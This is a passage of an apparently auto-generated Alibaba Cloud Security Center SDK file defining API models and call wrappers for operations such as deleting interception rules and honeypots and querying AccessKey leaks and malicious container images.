  body: DeleteInterceptionRuleResponseBody(name='body'),
}

async function deleteInterceptionRuleWithOptions(request: DeleteInterceptionRuleRequest, runtime: Util.RuntimeOptions): DeleteInterceptionRuleResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.ruleIds)) {
    query['RuleIds'] = request.ruleIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteInterceptionRule',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteInterceptionRule(request: DeleteInterceptionRuleRequest): DeleteInterceptionRuleResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteInterceptionRuleWithOptions(request, runtime);
}

model DeleteInterceptionTargetRequest {
  targetIds?: string(name='TargetIds', example='1,11,111'),
}

model DeleteInterceptionTargetResponseBody = {
  requestId?: string(name='RequestId', example='D81DD78E-E006-5C65-A171-C8CB09XXXXX'),
  result?: boolean(name='Result', example='true'),
}

model DeleteInterceptionTargetResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteInterceptionTargetResponseBody(name='body'),
}

async function deleteInterceptionTargetWithOptions(request: DeleteInterceptionTargetRequest, runtime: Util.RuntimeOptions): DeleteInterceptionTargetResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.targetIds)) {
    query['TargetIds'] = request.targetIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteInterceptionTarget',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteInterceptionTarget(request: DeleteInterceptionTargetRequest): DeleteInterceptionTargetResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteInterceptionTargetWithOptions(request, runtime);
}

model DeleteLoginBaseConfigRequest {
  config?: string(name='Config', description='The configuration item that you want to delete. The items vary based on the type of logon configurations. Valid values:

*   **login\\_common_ip**: approved logon IP addresses

Example: {"ip":"10.23.23.23"}.

*   **login\\_common_time**: approved logon time ranges

Example: {"startTime":"06:00:00","endTime":"16:00:00"}.

*   **login\\_common_account**: approved logon accounts

Example: {"account":"test_account\\_001"}.

*   **login\\_common_location**: approved logon locations

Example: {"location":"Shanghai"}.', example='{"startTime":"06:00:00","endTime":"16:00:00"}'),
  target?: string(name='Target', description='The UUID of the server whose logon configurations you want to delete.

> You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='4fe8e1cd-3c37-4851-b9de-124da32c****'),
  type?: string(name='Type', description='The type of logon configurations to delete. Valid values:

*   **login\\_common_ip**: approved logon IP addresses
*   **login\\_common_time**: approved logon time ranges
*   **login\\_common_account**: approved logon accounts
*   **login\\_common_location**: approved logon locations', example='login_common_time'),
}

model DeleteLoginBaseConfigResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteLoginBaseConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteLoginBaseConfigResponseBody(name='body'),
}

async function deleteLoginBaseConfigWithOptions(request: DeleteLoginBaseConfigRequest, runtime: Util.RuntimeOptions): DeleteLoginBaseConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.config)) {
    query['Config'] = request.config;
  }
  if (!Util.isUnset(request.target)) {
    query['Target'] = request.target;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteLoginBaseConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteLoginBaseConfig(request: DeleteLoginBaseConfigRequest): DeleteLoginBaseConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteLoginBaseConfigWithOptions(request, runtime);
}

model DeleteSecurityEventMarkMissListRequest {
  ids?: [ long ](name='Ids'),
  resourceOwnerId?: long(name='ResourceOwnerId'),
}

model DeleteSecurityEventMarkMissListResponseBody = {
  requestId?: string(name='RequestId', example='23AD0BD2-8771-5647-819E-6BA51E2XXXXX'),
}

model DeleteSecurityEventMarkMissListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteSecurityEventMarkMissListResponseBody(name='body'),
}

async function deleteSecurityEventMarkMissListWithOptions(request: DeleteSecurityEventMarkMissListRequest, runtime: Util.RuntimeOptions): DeleteSecurityEventMarkMissListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.ids)) {
    query['Ids'] = request.ids;
  }
  if (!Util.isUnset(request.resourceOwnerId)) {
    query['ResourceOwnerId'] = request.resourceOwnerId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteSecurityEventMarkMissList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteSecurityEventMarkMissList(request: DeleteSecurityEventMarkMissListRequest): DeleteSecurityEventMarkMissListResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteSecurityEventMarkMissListWithOptions(request, runtime);
}

model DeleteStrategyRequest {
  id?: string(name='Id', description='The ID of the baseline check policy that you want to delete.', example='1404656'),
  lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  sourceIp?: string(name='SourceIp', description='The source IP address of the request.', example='192.0.XX.XX'),
}

model DeleteStrategyResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='A4EB8B1C-1DEC-5E18-BCD0-D1BBB3936FA7'),
}

model DeleteStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteStrategyResponseBody(name='body'),
}

async function deleteStrategyWithOptions(request: DeleteStrategyRequest, runtime: Util.RuntimeOptions): DeleteStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteStrategy(request: DeleteStrategyRequest): DeleteStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteStrategyWithOptions(request, runtime);
}

model DeleteSuspEventNodeRequest {
  noteId?: long(name='NoteId', example='123'),
}

model DeleteSuspEventNodeResponseBody = {
  code?: string(name='Code', example='200'),
  message?: string(name='Message', example='successful'),
  requestId?: string(name='RequestId', example='A57C711B-AA15-55B2-8F61-4D09CEXXXXX'),
  success?: boolean(name='Success', example='true'),
}

model DeleteSuspEventNodeResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteSuspEventNodeResponseBody(name='body'),
}

async function deleteSuspEventNodeWithOptions(request: DeleteSuspEventNodeRequest, runtime: Util.RuntimeOptions): DeleteSuspEventNodeResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.noteId)) {
    query['NoteId'] = request.noteId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteSuspEventNode',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteSuspEventNode(request: DeleteSuspEventNodeRequest): DeleteSuspEventNodeResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteSuspEventNodeWithOptions(request, runtime);
}

model DeleteTagWithUuidRequest {
  tagName?: string(name='TagName', description='The name of the tag.', example='abc'),
  uuidList?: string(name='UuidList', description='The list of server UUIDs.

>  If the UuidList parameter is configured, Security Center removes the tag only from the servers whose UUIDs are specified by UuidList. If the UuidList parameter is not configured, Security Center removes the tag from all servers.', example='111-xx,aa-bb'),
}

model DeleteTagWithUuidResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='7E0618A9-D5EF-4220-9471-C42B5E92719F'),
}

model DeleteTagWithUuidResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteTagWithUuidResponseBody(name='body'),
}

/**
  * Security Center provides asset importance tags and custom tags. You can call this operation to remove only the custom tag that is added to an asset.
  *
  * @param request DeleteTagWithUuidRequest
  * @param runtime runtime options for this request RuntimeOptions
  * @return DeleteTagWithUuidResponse
 */
async function deleteTagWithUuidWithOptions(request: DeleteTagWithUuidRequest, runtime: Util.RuntimeOptions): DeleteTagWithUuidResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.tagName)) {
    query['TagName'] = request.tagName;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteTagWithUuid',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

/**
  * Security Center provides asset importance tags and custom tags. You can call this operation to remove only the custom tag that is added to an asset.
  *
  * @param request DeleteTagWithUuidRequest
  * @return DeleteTagWithUuidResponse
 */
async function deleteTagWithUuid(request: DeleteTagWithUuidRequest): DeleteTagWithUuidResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteTagWithUuidWithOptions(request, runtime);
}

model DeleteUniBackupPolicyRequest {
  policyId?: long(name='PolicyId', example='123'),
  policyIds?: string(name='PolicyIds', example='123,124'),
}

model DeleteUniBackupPolicyResponseBody = {
  requestId?: string(name='RequestId', example='4F07F4F1-88ED-5569-B519-FFCC9B7E****'),
}

model DeleteUniBackupPolicyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteUniBackupPolicyResponseBody(name='body'),
}

async function deleteUniBackupPolicyWithOptions(request: DeleteUniBackupPolicyRequest, runtime: Util.RuntimeOptions): DeleteUniBackupPolicyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.policyId)) {
    query['PolicyId'] = request.policyId;
  }
  if (!Util.isUnset(request.policyIds)) {
    query['PolicyIds'] = request.policyIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteUniBackupPolicy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteUniBackupPolicy(request: DeleteUniBackupPolicyRequest): DeleteUniBackupPolicyResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteUniBackupPolicyWithOptions(request, runtime);
}

model DeleteVpcHoneyPotRequest {
  vpcId?: string(name='VpcId', description='The ID of the virtual private cloud (VPC) on which the honeypot is deployed.

>  You can call the [DescribeVpcHoneyPotList](~~DescribeVpcHoneyPotList~~) operation to query the IDs of VPCs.', example='vpc-d7o009q63fqy21r8u****'),
}

model DeleteVpcHoneyPotResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='4347E985-6E64-467B-96EC-30D4EA9E32FB'),
}

model DeleteVpcHoneyPotResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteVpcHoneyPotResponseBody(name='body'),
}

async function deleteVpcHoneyPotWithOptions(request: DeleteVpcHoneyPotRequest, runtime: Util.RuntimeOptions): DeleteVpcHoneyPotResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.vpcId)) {
    query['VpcId'] = request.vpcId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteVpcHoneyPot',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteVpcHoneyPot(request: DeleteVpcHoneyPotRequest): DeleteVpcHoneyPotResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteVpcHoneyPotWithOptions(request, runtime);
}

model DeleteVulWhitelistRequest {
  id?: string(name='Id', description='The ID of the whitelist.

>  To delete a vulnerability whitelist, you must provide the ID of the whitelist. You can call the [DescribeVulWhitelist](~~DescribeVulWhitelist~~) operation to query the IDs of whitelists.', example='131231'),
  whitelist?: string(name='Whitelist', description='The information about the whitelist. The value is a JSON string that contains the following fields:

*   **Name**: the name of the vulnerability.

*   **Type**: the type of the vulnerability. Valid values:

    *   **cve**: Linux software vulnerability
    *   **sys**: Windows system vulnerability
    *   **cms**: Web-CMS vulnerability
    *   **app**: application vulnerability
    *   **emg**: urgent vulnerability

*   **AliasName**: the alias of the vulnerability.', example='[
      {
            "Name": "oval:com.redhat.rhsa:def:20173263",
            "Type": "cve",
            "AliasName": "RHSA-2017:3263: curl security update"
      }
]'),
}

model DeleteVulWhitelistResponseBody = {
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='9FBC6E47-7508-58C9-9E76-528E118CB1CC'),
}

model DeleteVulWhitelistResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DeleteVulWhitelistResponseBody(name='body'),
}

async function deleteVulWhitelistWithOptions(request: DeleteVulWhitelistRequest, runtime: Util.RuntimeOptions): DeleteVulWhitelistResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  if (!Util.isUnset(request.whitelist)) {
    query['Whitelist'] = request.whitelist;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DeleteVulWhitelist',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function deleteVulWhitelist(request: DeleteVulWhitelistRequest): DeleteVulWhitelistResponse {
  var runtime = new Util.RuntimeOptions{};
  return deleteVulWhitelistWithOptions(request, runtime);
}

model DescribeAccessKeyLeakDetailRequest {
  id?: long(name='Id', description='The ID of the AccessKey pair leak.', example='389357'),
}

model DescribeAccessKeyLeakDetailResponseBody = {
  accesskeyId?: string(name='AccesskeyId', description='The ID of the AccessKey pair that is leaked.', example='LTAI4G4VjkC9wenfEvgX****'),
  asset?: string(name='Asset', description='The platform to which the asset belongs. The value is fixed as **Cloud platform**.', example='Cloud platform'),
  code?: string(name='Code', description='The code snippet that is leaked.', example='\\n1231 \\nak=LTAI4G4VjkC9wenfEvgX**** \\n12311123 \\nsk1999 \\nsk1999sk1999 \\nsk1999sk1999 \\n\\n\\ntest001 ak hht \\nak=LTAI4G4VjkC9wenfEvgX**** \\nsk=AjEhS9XmnIzllpAx2LxMTMdrTG****'),
  dealTime?: string(name='DealTime', description='The time when the AccessKey pair leak was handled.', example='2022-01-17 15:47:08'),
  dealType?: string(name='DealType', description='The solution to the AccessKey pair leak. Valid values:

*   **manual**: manually deleted
*   **disable**: manually disabled
*   **add-whitelist**: added to the whitelist
*   **pending**: unhandled', example='add-whitelist'),
  githubFileName?: string(name='GithubFileName', description='The name of the GitHub file.', example='testAkLeak'),
  githubFileType?: string(name='GithubFileType', description='The type of the GitHub file. Valid values:

*   Python
*   XML
*   GO
*   Javascript
*   INI
*   JSON
*   C++', example='Python'),
  githubFileUpdateTime?: string(name='GithubFileUpdateTime', description='The time when the GitHub file was updated.', example='2021-07-06T09:49:33'),
  githubFileUrl?: string(name='GithubFileUrl', description='The URL of the GitHub file.', example='https://github.com/Blue00Blue/ExamOnline/blob/6c932c10fc3f217783f3937e2b230f79656c18a7/testAk****'),
  githubRepoName?: string(name='GithubRepoName', description='The name of the GitHub repository.', example='ExamOnline'),
  githubRepoUrl?: string(name='GithubRepoUrl', description='The URL of the GitHub repository.', example='https://github.com/Blue00Blue/ExamOn****'),
  githubUser?: string(name='GithubUser', description='The username of the GitHub user.', example='Blue00Blue'),
  githubUserPicUrl?: string(name='GithubUserPicUrl', description='The URL of the profile picture for the GitHub user.', example='https://avatars.githubusercontent.com/u/26296896?s=48&v=****'),
  gmtCreate?: string(name='GmtCreate', description='The first time when the AccessKey pair leak was detected.', example='2021-07-06 17:49:41'),
  gmtModified?: string(name='GmtModified', description='The last time when the AccessKey pair leak was detected.', example='2021-07-06 17:49:39'),
  remark?: string(name='Remark', description='The remarks of the AccessKey pair leak.', example='12'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='79CFF74D-E967-5407-8A78-EE03B925FDAA'),
  source?: string(name='Source', description='The platform on which the AccessKey pair leak is detected.', example='GitHub'),
  type?: string(name='Type', description='The type of the leak. The value is fixed as **AccessKey**.', example='AccessKey'),
  whitelistStatus?: string(name='WhitelistStatus', description='Indicates whether the AccessKey pair leak is added to the whitelist. Valid values:

*   **no**: The AccessKey pair leak is not added to the whitelist.
*   **yes**: The AccessKey pair leak is added to the whitelist.', example='no'),
}

model DescribeAccessKeyLeakDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAccessKeyLeakDetailResponseBody(name='body'),
}

async function describeAccessKeyLeakDetailWithOptions(request: DescribeAccessKeyLeakDetailRequest, runtime: Util.RuntimeOptions): DescribeAccessKeyLeakDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAccessKeyLeakDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAccessKeyLeakDetail(request: DescribeAccessKeyLeakDetailRequest): DescribeAccessKeyLeakDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAccessKeyLeakDetailWithOptions(request, runtime);
}

model DescribeAccesskeyLeakListRequest {
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Default value: **1**.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries to return on each page.\\
Maximum value: 100. Default value: 20. If you leave this parameter empty, 20 entries are returned on each page.

> : We recommend that you do not leave this parameter empty.', example='20'),
  query?: string(name='Query', description='The AccessKey ID that you want to query. Only exact match is supported.', example='LTAI4Fytv7ALKzkNVBV6****'),
  startTs?: long(name='StartTs', description='The beginning of the time range to query. You can query all AccessKey pair leaks that are detected later than this time point. The value of this parameter is a UNIX timestamp. Unit: milliseconds.', example='1614155361489'),
  status?: string(name='Status', description='Specifies whether an AccessKey pair leak is handled. Valid values:

*   **pending**: unhandled
*   **dealed**: handled', example='pending'),
}

model DescribeAccesskeyLeakListResponseBody = {
  accessKeyLeakList?: [ 
    {
      accesskeyId?: string(name='AccesskeyId', description='The ID of the AccessKey pair that is leaked.', example='LTAI4Fytv7ALKzkNVBV6****'),
      aliUserName?: string(name='AliUserName', description='The name of the Alibaba Cloud account that is affected.', example='testAccountName'),
      asset?: string(name='Asset', description='The platform to which the asset belongs. The value is fixed as **Cloud platform**.', example='Cloud platform'),
      dealTime?: string(name='DealTime', description='The time when the AccessKey pair leak is handled.', example='2020-12-03 21:23:38'),
      dealType?: string(name='DealType', description='The method to handle the AccessKey pair leak. Valid values:

*   **pending**: The AccessKey pair leak is unhandled.
*   **manual**: The AccessKey pair leak is manually handled.
*   **disable**: The AccessKey pair leak is disabled.
*   **add-whitelist**: The AccessKey pair leak is added to the whitelist.', example='pending'),
      gmtModified?: long(name='GmtModified', description='The time when the AccessKey pair leak is first detected. The value of this parameter is a UNIX timestamp. Unit: milliseconds.', example='1612357897000'),
      id?: long(name='Id', description='The primary key ID of the database.', example='389357'),
      status?: string(name='Status', description='Indicates whether the AccessKey pair leak is handled. Valid values:

*   **pending**: unhandled
*   **dealed**: handled', example='pending'),
      type?: string(name='Type', description='The type of the leak. The value is fixed as **AccessKey**.', example='AccessKey'),
      url?: string(name='Url', description='The URL of the platform on which the AccessKey pair leak is detected.', example='https://github.com/hht312/test-ak/blob/0e466d2ecce55b4c924d773a058e5dc602d8****/1001'),
      userType?: string(name='UserType', description='The type of the account to which the leaked AccessKey pair belongs. Valid values:

*   **master**: Alibaba Cloud account
*   **ram**: RAM user', example='master'),
    }
  ](name='AccessKeyLeakList', description='An array that consists of the details about AccessKey pair leaks.'),
  akLeakCount?: int32(name='AkLeakCount', description='The number of AccessKey pair leaks that are unhandled.', example='1'),
  currentPage?: int32(name='CurrentPage', description='The page number of the returned page.', example='1'),
  gmtLast?: long(name='GmtLast', description='This parameter is deprecated.', example='1612357897000'),
  pageSize?: int32(name='PageSize', description='The number of entries returned on each page.', example='20'),
  requestId?: string(name='RequestId', description='The ID of the request.', example='B37C9052-A73E-4707-A024-9247702852BE'),
  totalCount?: int32(name='TotalCount', description='The total number of AccessKey pair leaks.', example='2'),
}

model DescribeAccesskeyLeakListResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAccesskeyLeakListResponseBody(name='body'),
}

async function describeAccesskeyLeakListWithOptions(request: DescribeAccesskeyLeakListRequest, runtime: Util.RuntimeOptions): DescribeAccesskeyLeakListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.query)) {
    query['Query'] = request.query;
  }
  if (!Util.isUnset(request.startTs)) {
    query['StartTs'] = request.startTs;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAccesskeyLeakList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAccesskeyLeakList(request: DescribeAccesskeyLeakListRequest): DescribeAccesskeyLeakListResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAccesskeyLeakListWithOptions(request, runtime);
}

model DescribeAffectedAssetsRequest {
  current?: string(name='Current', example='1'),
  levels?: string(name='Levels', example='serious,suspicious,remind'),
  pageSize?: string(name='PageSize', example='10'),
}

model DescribeAffectedAssetsResponseBody = {
  assetList?: [ 
    {
      instanceId?: string(name='InstanceId', example='11'),
      instanceName?: string(name='InstanceName', example='11'),
      internetIp?: string(name='InternetIp', example='10.10.XX.XX'),
      intranetIp?: string(name='IntranetIp', example='172.0.XX.XX'),
      riskNum?: int32(name='RiskNum', example='1'),
      uuid?: string(name='Uuid', example='947d7514-258a-4b47-9dde-9dxxxxxxxxxx'),
    }
  ](name='AssetList'),
  pageInfo?: {
    count?: int32(name='Count', example='10'),
    currentPage?: int32(name='CurrentPage', example='1'),
    pageSize?: int32(name='PageSize', example='20'),
    totalCount?: int32(name='TotalCount', example='100'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId', example='7E0618A9-D5EF-4220-9471-C42XXXXXXXX'),
}

model DescribeAffectedAssetsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeAffectedAssetsResponseBody(name='body'),
}

async function describeAffectedAssetsWithOptions(request: DescribeAffectedAssetsRequest, runtime: Util.RuntimeOptions): DescribeAffectedAssetsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.current)) {
    query['Current'] = request.current;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeAffectedAssets',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeAffectedAssets(request: DescribeAffectedAssetsRequest): DescribeAffectedAssetsResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeAffectedAssetsWithOptions(request, runtime);
}

model DescribeAffectedMaliciousFileImagesRequest {
  clusterId?: string(name='ClusterId', description='The ID of the container cluster.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of container clusters.', example='c60b77fe62093480db6164a3c2fa5****'),
  clusterName?: string(name='ClusterName', description='The name of the cluster.', example='minikube'),
  containerId?: string(name='ContainerId', description='The ID of the container.', example='cc20a1024011c44b6a8710d6f8b****'),
  currentPage?: int32(name='CurrentPage', description='The number of the page to return. Pages start from page **1**. Default value: **1**.', example='1'),
  image?: string(name='Image', description='The name of the container image.', example='registry.cn-wulanchabu.aliyuncs.com/sas_test/huxin-test-001:nuxeo6-****'),
  imageDigest?: string(name='ImageDigest', description='The image digest.', example='6a5e103187b31a94592a47a5858617f7a179ead61df7606****'),
  imageLayer?: string(name='ImageLayer', description='The image layer.', example='27213ad375b53628dd152a5ca****'),
  imageTag?: string(name='ImageTag', description='The tag that is added to the image.', example='0.2'),
  lang?: string(name='Lang', description='The language of the content within the request and the response. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
  levels?: string(name='Levels', description='The severity of the malicious image sample. Separate multiple severities with commas (,). Valid values: serious suspicious remind', example='serious,suspicious'),
  maliciousMd5?: string(name='MaliciousMd5', description='The MD5 hash value of the malicious image sample.

>  You can call the [DescribeGroupedMaliciousFiles](~~DescribeGroupedMaliciousFiles~~) operation to query the MD5 hash values of malicious image samples.', example='d836968041f7683b5459****'),
  namespace?: string(name='Namespace', description='The namespace.', example='test-002'),
  pageSize?: string(name='PageSize', description='The number of entries to return on each page. Default value: **20**.', example='20'),
  pod?: string(name='Pod', description='The pod.', example='22222-7xsqq'),
  repoId?: string(name='RepoId', description='The ID of the image repository.

>  You can call the [ListRepository](~~ListRepository~~) operation to query the IDs of image repositories from the value of the **RepoId** response parameter.', example='crr-vridcl4****'),
  repoInstanceId?: string(name='RepoInstanceId', description='The ID of the container image.

>  You can call the [ListRepository](~~ListRepository~~) operation to query the IDs of container images from the value of the **InstanceId** response parameter.', example='cri-datvailb****'),
  repoName?: string(name='RepoName', description='The name of the image repository.

>  Fuzzy match is supported.', example='centos'),
  repoNamespace?: string(name='RepoNamespace', description='The namespace to which the image repository belongs.

>  Fuzzy match is supported.', example='hanghai-namespace'),
  repoRegionId?: string(name='RepoRegionId', description='The region ID of the image repository. Valid values:

*   **cn-beijing**: China (Beijing)
*   **cn-zhangjiakou**: China (Zhangjiakou)
*   **cn-hangzhou**: China (Hangzhou)
*   **cn-shanghai**: China (Shanghai)
*   **cn-shenzhen**: China (Shenzhen)
*   **cn-hongkong**: China (Hong Kong)
*   **ap-southeast-1**: Singapore
*   **ap-southeast-5**: Indonesia (Jakarta)
*   **us-east-1**: US (Virginia)
*   **us-west-1**: US (Silicon Valley)
*   **eu-central-1**: Germany (Frankfurt)
*   **eu-west-1**: UK (London)
*   **ap-south-1**: India (Mumbai)', example='cn-hangzhou'),
  scanRange?: [ string ](name='ScanRange', description='The types of the assets that you want to scan.'),
}

model DescribeAffectedMaliciousFileImagesResponseBody = {
  affectedMaliciousFileImagesResponse?: [ 
    {
      clusterId?: string(name='ClusterId', description='The ID of the cluster.', example='c08d5fc1a329a4b88950a253d082f1****'),
      clusterName?: string(name='ClusterName', description='The name of the cluster.', example='docker-law'),
      containerId?: string(name='ContainerId', description='The ID of the container.', example='04d20e98c8e2c93b7b864372084320a15a58c8671e53c972ce3a71d9c163****'),
      digest?: string(name='Digest', description='The image digest.', example='6a5e1031a5858617f7d8a179ead6****'),
